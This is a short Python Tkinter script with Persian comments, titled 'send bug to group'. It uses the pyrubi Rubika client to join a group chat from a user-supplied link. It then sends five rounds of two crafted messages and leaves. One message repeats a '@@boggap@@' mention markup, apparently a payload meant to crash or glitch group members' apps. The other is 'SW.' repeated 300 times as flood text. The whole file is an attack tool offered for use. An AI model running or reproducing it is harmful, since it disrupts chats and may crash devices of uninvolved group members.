import tkinter as tk
from tkinter import messagebox
import pyrubi




# تعریف تابع برای ارسال پیام
def send_messages():
    bot = pyrubi.Client("bog_bot")
    try:
        # دریافت لینک از ورودی کاربر
        link = chat_link_entry.get()
        if not link:
            messagebox.showerror("Error", "Please enter a chat link")
            return

        # پیوستن به چت و دریافت GUID
        guid = bot.join_chat(link)["group"]["group_guid"]
        log_output.insert(tk.END, f"Joined chat with GUID: {guid}\n")

        # تعریف پیام‌های ارسال
        message_1 = "@@boggap@@(u0FGbWD0fdcda6aa41534a4e5fff7568) @@boggap@@(u0FGbWD0fdcda6aa41534a4e5fff7568)"
        message_2 = "SW." * 300  # ایجاد یک رشته که 250 بار "SW." را تکرار می‌کند

        # حلقه ارسال پیام
        for i in range(5):
            log_output.insert(tk.END, f"Sending message {i+1}\n")
            bot.send_text(guid, message_1)
            bot.send_text(guid, message_2)

        # ترک چت پس از ارسال پیام‌ها
        bot.leave_chat(guid)
        log_output.insert(tk.END, "Left the chat.\n")
    except Exception as e:
        messagebox.showerror("Error", str(e))

# ایجاد پنجره اصلی با Tkinter
root = tk.Tk()
root.title("ارسال باگ به گروه")

# تنظیم اندازه پنجره
root.geometry("500x400")
root.config(bg="#2c3e50")  # رنگ پس‌زمینه تیره برای پنجره اصلی

# فونت و استایل
label_font = ("Arial", 12, "bold")
entry_font = ("Arial", 12)
button_font = ("Arial", 12, "bold")

# ایجاد فریم برای ورودی‌ها
input_frame = tk.Frame(root, bg="#2c3e50")
input_frame.pack(pady=20)

# لیبل و ورودی لینک چت
chat_link_label = tk.Label(input_frame, text="Chat Link:", font=label_font, fg="white", bg="#2c3e50")
chat_link_label.grid(row=0, column=0, padx=10)

chat_link_entry = tk.Entry(input_frame, width=40, font=entry_font)
chat_link_entry.grid(row=0, column=1, padx=10)

# دکمه ارسال
send_button = tk.Button(root, text="Send Messages", font=button_font, bg="#1abc9c", fg="white", padx=10, pady=5, command=send_messages)
send_button.pack(pady=10)

# جعبه نمایش لاگ‌ها
log_output = tk.Text(root, height=10, width=60, font=("Courier", 10), bg="#34495e", fg="white", padx=10, pady=10)
log_output.pack(pady=10)

# اجرای برنامه
root.mainloop()
